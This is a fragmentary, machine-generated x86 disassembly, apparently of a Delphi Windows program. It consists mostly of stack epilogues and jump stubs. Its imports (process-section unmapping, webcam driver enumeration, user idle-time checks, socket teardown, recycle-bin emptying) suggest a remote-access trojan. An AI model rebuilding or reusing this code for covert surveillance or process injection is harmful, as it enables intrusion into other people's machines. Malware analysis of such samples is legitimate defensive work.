jmp sub_404b30
sub_47274f
jmp sub_404b30
sub_472877
jmp sub_404b30
sub_472969
jmp sub_404de4
sub_472970
pop ebx
pop ecx
pop ebp
retn
sub_4729d0
jmp sub_404de4
sub_4729d7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_472b0d
jmp sub_404b30
sub_472bd6
jmp sub_404b30
sub_472c12
jmp sub_404de4
sub_472c19
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472dab
jmp sub_404b30
sub_472de7
jmp sub_404de4
sub_472dee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
WSAIoctl
jmp [ WSAIoctl@IAT ]
sub_4730d5
jmp sub_404b30
sub_473108
jmp sub_404de4
sub_47310f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47330b
jmp sub_404b30
sub_473339
jmp sub_404de4
sub_473340
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473409
jmp sub_404de4
sub_473438
jmp sub_404de4
sub_47343f
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_473525
jmp sub_404de4
sub_47352c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_473540
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call InternetCloseHandle
mov eax [ rw-data ]
push eax
call InternetCloseHandle
sub_4735d8
jmp sub_404de4
sub_4735df
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_473714
jmp sub_404de4
sub_473725
jmp sub_404b30
sub_47375f
jmp sub_404de4
sub_473766
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4738e7
jmp sub_404de4
sub_473916
jmp sub_404de4
sub_47391d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
SHGetFolderPathA
jmp [ SHGetFolderPathA@IAT ]
NtUnmapViewOfSection
jmp [ NtUnmapViewOfSection@IAT ]
sub_473a27
jmp sub_404de4
sub_473a2e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_473ad0
jmp sub_404de4
sub_473ad7
pop ebx
pop ecx
pop ebp
retn
sub_473b47
jmp sub_404de4
sub_473b4e
pop ebx
pop ecx
pop ebp
retn
sub_473c15
jmp sub_404de4
sub_473c1c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_473cf8
jmp sub_404de4
sub_473cff
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_473daa
jmp sub_404de4
sub_473db1
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47419c
jmp sub_404de4
sub_4741a3
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4741ff
jmp sub_404de4
sub_474206
pop ebp
retn
sub_474324
cmp [ rw-data ] 0x0
jbe r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4749d3
jmp sub_404de4
sub_474a0a
jmp sub_404de4
sub_474a11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474d1e
jmp sub_404b30
sub_474dde
jmp sub_404de4
sub_474de5
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475246
jmp sub_404de4
sub_47524d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4754ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_475829
jmp sub_404de4
sub_475830
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475a51
jmp sub_404de4
sub_475a58
pop ebx
pop ecx
pop ebp
retn
sub_475a9d
jmp sub_404de4
sub_475aa4
pop ebx
pop ecx
pop ebp
retn
sub_475ae9
jmp sub_404de4
sub_475af0
pop ebx
pop ecx
pop ebp
retn
sub_475b35
jmp sub_404de4
sub_475b3c
pop ebx
pop ecx
pop ebp
retn
sub_475b81
jmp sub_404de4
sub_475b88
pop ebx
pop ecx
pop ebp
retn
sub_475bcd
jmp sub_404de4
sub_475bd4
pop ebx
pop ecx
pop ebp
retn
sub_475cec
jmp sub_404b30
sub_475d47
jmp sub_404b30
sub_475d76
jmp sub_404de4
sub_475d7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475ebd
jmp sub_404de4
sub_475ec4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475f58
jmp sub_404de4
sub_475f5f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475fca
jmp sub_404de4
sub_475fd1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47608a
jmp sub_404de4
sub_476091
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477dc6
jmp sub_404de4
sub_47a077
jmp sub_404de4
sub_47b67a
jmp sub_404de4
sub_47d13e
jmp sub_404b30
sub_47d27b
jmp sub_404de4
sub_47d285
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e353
[ ecx ]
sub_47e3bf
jmp [ eax ]
sub_47ecf0
jmp sub_404de4
sub_47ecf7
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47edb1
retn
sub_47edb2
jmp sub_404de4
j_sub_47edb1
jmp sub_47edb1
sub_47edb9
pop ebp
retn
sub_47f0fe
jmp sub_404de4
sub_47f105
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f40e
jmp sub_404de4
sub_47f42b
jmp sub_404de4
sub_47f432
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_404b30#4
jmp sub_404b30
sub_47f930
jmp sub_404de4
sub_47f937
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f97c
cmp [ eax + 0x44 ] 0x1
je r-xdata
retn
call sub_47f4e0
sub_47f9c9
jmp sub_404de4
sub_47f9d0
pop ebx
pop ecx
pop ebp
retn
sub_47f9d4
mov [ eax + 0x44 ] edx
retn
sub_47f9d8
mov [ eax + 0x48 ] edx
retn
sub_47fa1d
jmp sub_404de4
sub_47fa24
pop ebx
pop ecx
pop ebp
retn
sub_47fd2b
jmp sub_404de4
sub_47fd80
jmp sub_404de4
sub_47fd87
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47fda0
mov [ eax + 0x40 ] edx
retn
sub_47fda4
mov [ eax + 0x44 ] edx
retn
sub_47fda8
mov [ eax + 0x48 ] edx
retn
sub_480012
jmp sub_404de4
sub_480053
jmp sub_404de4
sub_48005a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480074
mov [ eax + 0x40 ] edx
retn
sub_48018e
jmp sub_404b30
sub_4801d3
jmp sub_404de4
sub_4801da
mov eax [ ebp - 0x170 ]
mov edx [ ebp - 0x16c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4801f0
xor edx edx
mov [ eax + 0x48 ] edx
call sub_4801fc
retn
sub_480523
jmp sub_404b30
sub_48061c
jmp sub_404de4
sub_480623
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480743
jmp sub_404de4
sub_48074a
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4807cb
jmp sub_404de4
sub_4807d2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4807d8
cmp edx 0xffffffff
je r-xdata
mov [ eax + 0x48 ] 0xffffffff
retn
mov [ eax + 0x44 ] edx
retn
sub_480c86
jmp sub_404de4
sub_480c8d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480cf4
cmp edx 0xffffffff
je r-xdata
mov [ eax + 0x48 ] 0xffffffff
retn
mov [ eax + 0x44 ] edx
retn
sub_480e13
jmp sub_404de4
sub_480e1a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480f00
jmp sub_404b30
sub_480f43
jmp sub_404de4
sub_480f4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480fdd
jmp sub_404de4
sub_480fe4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_481081
jmp sub_404de4
sub_48109e
jmp sub_404de4
sub_4810a5
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4810b0
push ebx
mov ebx eax
call sub_431a7c
mov dx 0x1
call sub_431a44
test al al
je r-xdata
pop ebx
retn
call sub_431a7c
mov edx ebx
call sub_431584
sub_481283
jmp sub_404de4
sub_48128a
mov esp ebp
pop ebp
retn
sub_4813c1
jmp sub_404b30
sub_48163c
jmp sub_404b30
sub_481687
jmp sub_404de4
sub_4816c3
jmp sub_404de4
sub_4816ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48187c
jmp sub_404de4
sub_481883
mov esp ebp
pop ebp
retn
sub_481d4d
jmp sub_404b30
sub_481d86
jmp sub_404de4
sub_481d8d
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_481ff9
lea eax [ ebp - 0x24 ]
mov edx 0x9
call sub_405554
retn
sub_482007
jmp sub_404de4
j_sub_481ff9
jmp sub_481ff9
sub_48200e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4820bb
jmp sub_404de4
sub_4820c2
pop ebp
retn
sub_482142
jmp sub_404de4
sub_482149
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_482542
jmp sub_404de4
sub_482549
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4825d2
jmp sub_404de4
sub_4825d9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_482ac6
push 0x0
call ExitThread
sub_482bfe
push 0x0
call ExitThread
sub_482cb2
jmp sub_404de4
sub_482cb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4833ae
push 0x2
mov eax [ ebp - 0x28 ]
push eax
call shutdown
mov eax [ ebp - 0x28 ]
push eax
call closesocket
mov eax [ ebp - 0x2c ]
call sub_404650
push 0x0
call ExitThread
sub_4835bf
jmp sub_404b30
sub_4835c4
lea eax [ ebp - 0x428 ]
call sub_48ce74
mov ecx [ ebp - 0x428 ]
lea eax [ ebp - 0x424 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x424 ]
call sub_475e2c
push 0x0
call ExitThread
sub_483630
jmp sub_404de4
sub_483637
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_48364f
jmp [ eax + eax ]
sub_4837f1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48381e
lea eax [ ebp - 0x41c ]
call sub_405530
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_483817
jmp sub_404de4
sub_48381e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4839ea
add [ eax ] al
sub_483bdc
jmp sub_404de4
sub_483be3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_483e9f
[ esi ]
sub_483ed7
jmp [ eax + eax ]
sub_484037
jmp sub_404de4
sub_48403e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4840c4
jmp sub_404de4
sub_4840cb
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_484275
jmp sub_404de4
sub_48427c
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4843e0
jmp sub_404de4
sub_48447b
jmp sub_404de4
sub_484689
jmp sub_404de4
sub_484690
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4847a5
jmp sub_404de4
sub_4847ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4847d1
lea eax [ ebp - 0x134 ]
mov edx 0x2
call sub_405554
retn
sub_4847ca
jmp sub_404de4
sub_4847d1
pop ebx
mov esp ebp
pop ebp
retn
sub_484a9b
jmp sub_404de4
sub_484acd
jmp sub_404de4
sub_484aff
jmp sub_404de4
sub_484b06
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_484c82
jmp sub_404b30
sub_484d6b
jmp sub_404de4
sub_484d9a
jmp sub_404de4
sub_484da1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_484dc3
[ edx ]
sub_484ee8
cmp [ eax + 0x40 ] 0x0
jae r-xdata
cmp [ eax + 0x40 ] 0x1
jbe r-xdata
mov [ eax + 0x40 ] 0x1
mov [ eax + 0x40 ] dx
retn
mov [ eax + 0x40 ] 0x1
sub_484f66
jmp sub_404de4
sub_484f6d
pop esi
pop ecx
pop ebp
retn
sub_484fb5
jmp sub_404de4
sub_484fbc
pop ebx
pop ecx
pop ebp
retn
sub_4850b9
jmp sub_404b30
sub_4850ed
jmp sub_404de4
sub_4850f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_48514e
add [ eax ] al
sub_4851de
jmp sub_404b30
sub_48520a
jmp sub_404de4
sub_485211
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48532a
jmp sub_404b30
sub_485356
jmp sub_404de4
sub_48535d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48549b
jmp sub_404de4
sub_4854a2
pop ebx
mov esp ebp
pop ebp
retn
sub_485755
jmp sub_404de4
sub_48575c
pop ebx
mov esp ebp
pop ebp
retn
sub_485939
jmp sub_404de4
sub_485940
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_485c82
jmp sub_404de4
sub_485cbe
jmp sub_404de4
sub_485cc5
pop ebx
mov esp ebp
pop ebp
retn
sub_485d50
mov [ eax + 0x40 ] edx
retn
sub_485d95
jmp sub_404de4
sub_485d9c
pop ebx
pop ecx
pop ebp
retn
sub_485da0
movzx eax [ eax + 0x48 ]
retn
sub_485de9
jmp sub_404de4
sub_485df0
pop ebx
pop ecx
pop ebp
retn
sub_485f28
jmp sub_404b30
sub_486072
jmp sub_404de4
sub_486079
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4861fe
jmp sub_404b30
sub_486203
call sub_404f40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4862fc
mov [ eax + 0x44 ] edx
retn
sub_486300
mov [ eax + 0x48 ] edx
retn
sub_486304
mov [ eax + 0x4c ] edx
retn
sub_486308
mov [ eax + 0x50 ] edx
retn
sub_48630c
movzx eax [ eax + 0xd ]
retn
sub_48642a
jmp sub_404de4
sub_486431
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4864b4
mov [ eax + 0x40 ] edx
retn
sub_4864b8
mov eax [ rw-data ]
mov [ eax ] edx
retn
sub_4868d4
jmp sub_404de4
sub_4868db
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4868e4
call sub_4865e0
retn
sub_486e16
jmp sub_404de4
sub_486e1d
mov eax [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4872da
jmp sub_404de4
sub_4872fc
jmp sub_404de4
sub_487303
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_487446
jmp sub_404de4
sub_487468
jmp sub_404de4
sub_48746f
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48764f
jmp sub_404de4
sub_487671
jmp sub_404de4
sub_487678
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48782d
jmp sub_404b30
sub_487865
jmp sub_404de4
sub_487887
jmp sub_404de4
sub_48788e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4879d1
jmp sub_404de4
sub_487a08
jmp sub_404de4
sub_487a0f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_487a87
jmp sub_404de4
sub_487a8e
pop ecx
pop ecx
pop ebp
retn
sub_487ae7
jmp sub_404de4
sub_487aee
pop ebp
retn
sub_487dfc
mov [ eax + 0x40 ] edx
retn
sub_487e00
mov [ eax + 0x44 ] edx
retn
sub_487e04
test edx edx
jge r-xdata
cmp edx 0x64
jle r-xdata
xor edx edx
mov [ eax + 0x48 ] edx
retn
mov edx 0x64
sub_487e18
cmp [ eax + 0xd ] 0x0
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_488265
jmp sub_404de4
sub_48826c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_488294
mov [ eax + 0x40 ] edx
retn
sub_488298
test edx edx
jge r-xdata
cmp edx 0x64
jle r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
retn
mov edx 0x64
sub_4882ed
jmp sub_404de4
sub_4882f4
pop ebx
pop ecx
pop ebp
retn
sub_4882f8
test edx edx
jge r-xdata
cmp edx 0x64
jle r-xdata
xor edx edx
mov [ eax + 0x4c ] edx
retn
mov edx 0x64
sub_48835b
jmp sub_404de4
sub_488362
pop ebx
pop ecx
pop ebp
retn
sub_4883c3
jmp sub_404de4
sub_4883ca
pop ebx
pop ecx
pop ebp
retn
sub_48842b
jmp sub_404de4
sub_488432
pop ebx
pop ecx
pop ebp
retn
sub_488493
jmp sub_404de4
sub_48849a
pop ebx
pop ecx
pop ebp
retn
sub_4884ac
cmp [ eax + 0xd ] 0x0
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_4888e7
jmp sub_404b30
sub_488943
jmp sub_404de4
sub_48894a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4889b4
push ebx
mov ebx eax
push 0x2
mov eax [ ebx + 0x44 ]
push eax
call shutdown
mov eax [ ebx + 0x44 ]
push eax
call closesocket
pop ebx
retn
sub_4889d0
mov [ eax + 0x40 ] edx
retn
sub_4889d4
cmp [ eax + 0xd ] 0x0
je r-xdata
mov al 0x1
retn
xor eax eax
retn
GetMonitorInfoA
jmp [ GetMonitorInfoA@IAT ]
EnumDisplayMonitors
jmp [ EnumDisplayMonitors@IAT ]
sub_488aec
jmp sub_404de4
sub_488af3
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_488bac
jmp sub_404de4
sub_488bb3
pop ebx
pop ecx
pop ebp
retn
sub_488cac
jmp sub_404de4
sub_488cb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_488ef9
jmp sub_404de4
sub_488f38
jmp sub_404de4
sub_488f3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488f64
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_488f5d
jmp sub_404de4
sub_488f64
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48916a
jmp sub_404de4
sub_489171
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4891b5
jmp sub_404de4
sub_4891bc
pop ebp
retn
sub_4894b1
jmp sub_404de4
sub_4894b8
pop ebx
pop ecx
pop ebp
retn
sub_4894bc
mov [ eax + 0x44 ] edx
retn
sub_489501
jmp sub_404de4
sub_489508
pop ebx
pop ecx
pop ebp
retn
sub_48984e
jmp sub_404de4
sub_489855
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4898de
jmp sub_404de4
sub_4898e5
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489939
jmp sub_404de4
sub_489940
pop ebx
pop ecx
pop ebp
retn
sub_489944
mov [ eax + 0x4c ] edx
retn
sub_489948
movzx eax [ eax + 0x48 ]
retn
SHEmptyRecycleBinA
jmp [ SHEmptyRecycleBinA@IAT ]
sub_4899fb
jmp sub_404de4
sub_489a02
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489a0f
jmp [ edx ]
sub_489ae8
jmp sub_404de4
sub_489aef
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_489ba4
jmp sub_404de4
sub_489bab
pop ecx
pop ecx
pop ebp
retn
sub_489c5f
jmp sub_404de4
sub_489c66
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489d27
jmp sub_404de4
sub_489d2e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489def
jmp sub_404de4
sub_489df6
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489e75
jmp sub_404de4
sub_489e7c
pop ecx
pop ecx
pop ebp
retn
sub_489f88
jmp sub_404de4
sub_489f8f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489fb4
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_489fad
jmp sub_404de4
sub_489fb4
pop ebx
mov esp ebp
pop ebp
retn
sub_48a028
jmp sub_404b30
sub_48a114
add esp 0xfffffff8
mov [ esp ] 0x8
push esp
call GetLastInputInfo
call GetTickCount
sub eax [ esp + 0x4 ]
mov ecx 0x3e8
xor edx edx
div ecx
pop ecx
pop edx
retn
sub_48a1d2
jmp sub_404de4
sub_48a1e3
jmp sub_404b30
sub_48a203
jmp sub_404de4
sub_48a20a
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a2a4
jmp sub_404de4
sub_48a2ab
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a380
jmp sub_404b30
sub_48a3b7
jmp sub_404de4
sub_48a3be
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a450
jmp sub_404de4
sub_48a457
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_48a46c
push 0x1
push r-xdata
push 0x0
call SHEmptyRecycleBinA
retn
sub_48a614
jmp sub_404de4
sub_48a61b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a792
jmp sub_404de4
sub_48a799
pop ebx
pop ecx
pop ebp
retn
sub_48a85d
jmp sub_404de4
sub_48a864
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48aa9b
jmp sub_404de4
sub_48ab2d
jmp sub_404de4
sub_48ab4a
jmp sub_404de4
sub_48ab51
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48abe5
jmp sub_404de4
sub_48abec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ac0e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48ac07
jmp sub_404de4
sub_48ac0e
mov esp ebp
pop ebp
retn
sub_48ad60
jmp sub_404de4
sub_48ad67
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48ae8c
jmp sub_404de4
sub_48ae93
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48af93
jmp sub_404de4
sub_48afaf
jmp sub_404b30
sub_48afd6
jmp sub_404de4
sub_48afdd
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48b0f3
jmp sub_404de4
sub_48b0fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48b18f
jmp sub_404de4
sub_48b196
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48b2b5
jmp sub_404b30
sub_48b2dd
jmp sub_404de4
sub_48b2e4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48b3c7
jmp sub_404b30
sub_48b3f3
jmp sub_404de4
sub_48b3fa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48b697
jmp sub_404de4
sub_48b69e
pop ecx
pop ebp
retn
sub_48b878
jmp sub_404b30
sub_48b8ba
jmp sub_404de4
sub_48b8c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48ba30
jmp sub_404de4
sub_48ba4e
jmp sub_404b30
sub_48bab3
jmp sub_404de4
sub_48baba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48bb7c
jmp sub_404de4
sub_48bb83
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_48bbd1
jmp sub_404de4
sub_48bbd8
pop ecx
pop ebp
retn
sub_48bc3b
jmp sub_404de4
sub_48bc42
pop ebx
pop ecx
pop ebp
retn
sub_48bd67
jmp sub_404b30
sub_48bd99
jmp sub_404de4
sub_48bda0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48bec8
jmp sub_404de4
sub_48becf
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_48bf15
jmp sub_404b30
sub_48c027
jmp sub_404b30
sub_48c05c
jmp sub_404de4
sub_48c063
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48c15e
jmp sub_404b30
sub_48c18a
jmp sub_404de4
sub_48c191
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48c2eb
jmp sub_404de4
sub_48c2f2
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_48c396
jmp sub_404de4
sub_48c3a7
jmp sub_404b30
sub_48c3b3
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c3da
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48c3d3
jmp sub_404de4
sub_48c3da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48c473
jmp sub_404de4
sub_48c47a
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_48c59e
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_405554
retn
sub_48c5ac
jmp sub_404de4
j_sub_48c59e
jmp sub_48c59e
sub_48c5b3
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_48c601
jmp sub_404b30
sub_48c6b7
jmp sub_404b30
sub_48c6d9
jmp sub_404de4
sub_48c6e0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48c7d6
jmp sub_404de4
sub_48c8af
jmp sub_404b30
sub_48c8ec
jmp sub_404de4
sub_48c8f3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48c9cd
jmp sub_404b30
sub_48c9fa
jmp sub_404de4
sub_48ca01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48caa2
jmp sub_404b30
sub_48cacf
jmp sub_404de4
sub_48cad6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48cb79
jmp sub_404b30
sub_48cba6
jmp sub_404de4
sub_48cbad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48cddc
jmp sub_404de4
sub_48cde3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_48ce63
jmp sub_404de4
sub_48ce6a
pop ebp
retn
capGetDriverDescriptionA
jmp [ capGetDriverDescriptionA@IAT ]
sub_48cfa5
jmp sub_404de4
sub_48cfac
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48d07b
jmp sub_404de4
sub_48d082
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48d189
jmp sub_404b30
sub_48d1b6
jmp sub_404de4
sub_48d1bd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48d1df
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48d1d8
jmp sub_404de4
sub_48d1df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48d1f4
push ebx
mov ebx eax
mov ecx ebx
mov edx r-xdata
mov eax r-xdata
call sub_48d0fc
pop ebx
retn
sub_48d248
push ebx
mov ebx eax
mov ecx ebx
mov edx r-xdata
mov eax r-xdata
call sub_48d0fc
pop ebx
retn
sub_48d298
push ebx
mov ebx eax
mov ecx ebx
mov edx r-xdata
mov eax r-xdata
call sub_48d0fc
pop ebx
retn
sub_48d2b3
[ esi ]
sub_48d359
jmp sub_404b30
sub_48d373
[ esi ]
sub_48d59b
jmp sub_404de4
sub_48d5a2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48dbd6
jmp sub_404de4
sub_48dbdd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48dc97
jmp sub_404b30
sub_48dcc9
jmp sub_404de4
sub_48dcd0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48dd80
jmp sub_404b30
sub_48ddad
jmp sub_404de4
sub_48ddb4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48de71
jmp sub_404de4
sub_48de78
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48de84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_48df3a
jmp sub_404de4
sub_48df41
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_48dfe1
jmp sub_404de4
sub_48dfe8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_404de4#7
jmp sub_404de4
sub_48e064
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48e273
jmp sub_404de4
sub_48e27a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48e307
xor eax eax
pop edx
pop ecx
pop ecx
